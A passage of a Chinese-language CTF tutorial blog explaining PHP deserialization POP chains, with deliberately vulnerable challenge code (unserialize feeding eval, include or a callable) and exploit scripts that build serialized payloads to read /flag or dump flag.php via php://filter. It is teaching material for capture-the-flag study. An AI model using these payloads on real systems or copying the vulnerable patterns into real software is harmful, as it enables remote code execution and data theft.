class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) // 1. <span class="title">destruct</span>函数为<span class="title">pop</span>链头</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source=<span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source; <span class="comment">//输出变量，把类当作字符串，触发__toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) // 2</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source; <span class="comment">//访问不存在的属性，触发_get</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; <span class="comment">// 3 </span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getshell</span>(<span class="variable">$this</span>-&gt;params); <span class="comment">//直接调用getshell</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getshell</span>(<span class="params"><span class="variable">$value</span></span>)  // 4</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;params); <span class="comment">//尾，输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; <span class="comment">//GET传参头</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>先找链子的头和尾，头部明显是 GET 传参，尾部是 <code>Uwant</code>  类中的 <code>getshell</code> ，然后往上倒推， <code>Uwant</code>  类中的 <code>__get()</code>  中调用了 <code>getshell</code> ， <code>Show</code>  类中的 <code>toString</code>  调用了 <code>__get()</code> ，然后 <code>Hello</code>  类中的 <code>__destruct()</code> ，而我们 GET 传参之后会先进入 <code>__destruct()</code> ，这样子头和尾就连上了，所以说完整的链子就是：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">头 -&gt; Hello::__destruct() -&gt; Show::__toString() -&gt; Uwant::__get() -&gt; Uwant::getshell -&gt; 尾</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Uwant</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div><h4 id="例题"><a class="markdownIt-Anchor" href="#例题">#</a> 例题</h4><h5 id="newstarctf-2023-week3-pop-gadget"><a class="markdownIt-Anchor" href="#newstarctf-2023-week3-pop-gadget">#</a> newstarctf 2023 week3 | POP Gadget</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) //对象被销毁时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>; <span class="comment">//将对象当作字符串，可以触发__toString</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) //把对象当作字符串时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(); <span class="comment">//把对象当作方法（函数），触发__invoke</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>) //调用不可访问的方法时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>(); <span class="comment">//调用end函数</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) //将对象调用为函数时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>(); <span class="comment">//不存在getStr方法，触发__call</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>) //错误的<span class="title">end</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>) // 正确的<span class="title">end</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log); <span class="comment">//handle-&gt;log不可访问，触发__unset</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>) //在不可访问的属性上使用<span class="title">unset</span>(<span class="params"></span>)时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>); <span class="comment">//可以构造执行系统命令,比如:system(ls /)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure></div><p>由此可以构造出 POP 链子</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</span><br></pre></td></tr></table></figure></div><p>由于链子调用中成员属性有 private 和 protected，用 construct 方法去调用链子，最后再使用 url 编码绕过</p><p>exp</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func= <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;    </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;    </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="variable">$a</span>;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span> = <span class="variable">$b</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>(<span class="keyword">new</span> <span class="title class_">Then</span>(<span class="keyword">new</span> <span class="title class_">Super</span>(<span class="keyword">new</span> <span class="title class_">Handle</span>(<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>(<span class="keyword">new</span> <span class="title class_">WhiteGod</span>(<span class="string">&quot;readfile&quot;</span>,<span class="string">&quot;/flag&quot;</span>))))));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div><p>稍微总结一下，POP 链的头一般是 GET/POST 传参引发 <code>__wakeup</code>  ,  <code>__construct</code>  ,  <code>__destruct</code></p><p>结尾一般是输出敏感信息或者执行系统命令所在函数，即 GetFlag 的点</p><h5 id="mrctf2020ezpop1"><a class="markdownIt-Anchor" href="#mrctf2020ezpop1">#</a> [MRCTF2020]Ezpop1</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div><p>先找出可以 getflag 的点，在 <code>Modifier</code>  类中 <code>append</code>  函数有 <code>include</code>  函数可以文件包含，可以利用， <code>__invoke</code>  函数直接调用了 <code>append</code> ，在 Testlei 中 <code>__get</code>  将 p 作为函数调用，会触发 <code>__invoke</code> , 在 <code>__totring</code>  方法中 <code>$this-&gt;str</code>  赋予 <code>test</code>  类，在 <code>test</code>  类读取 <code>source</code>  变量，（因为 <code>test</code>  类中没有 <code>source</code>  属性，则是访问了不可访问的属性）则会自动调用 <code>__get</code>  魔术方法， <code>__wakeup</code>  函数将对象进行正则匹配，会触发 <code>__toString</code> ，而 <code>__wakeup</code>  在反序列化时会调用，可以当作 pop 链头，而尾时 <code>include</code>  函数，可以利用 <code>var</code>  构造 php 为协议获取 flag</p><p>pop 链：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show:__wakeup -&gt; Show:__toString -&gt; Test:__get -&gt; Modifier:__invoke -&gt;Modifier: append</span><br></pre></td></tr></table></figure></div><p>exp:</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>; <span class="comment">//构造php为协议获取flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;source=<span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125; <span class="comment">//1.将用到的类写出形成框架并表明类的属性（变量）</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>(); <span class="comment">//将用到的类实例化，用到几次实例化几次</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p= <span class="variable">$d</span>;    <span class="comment">//根据pop链将对象串联起来</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));  <span class="comment">//序列化头并url编码（在这个题中有protected修饰的属性，会有不可见字符）</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="2021-强网杯-赌徒"><a class="markdownIt-Anchor" href="#2021-强网杯-赌徒">#</a> 2021 强网杯 赌徒</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 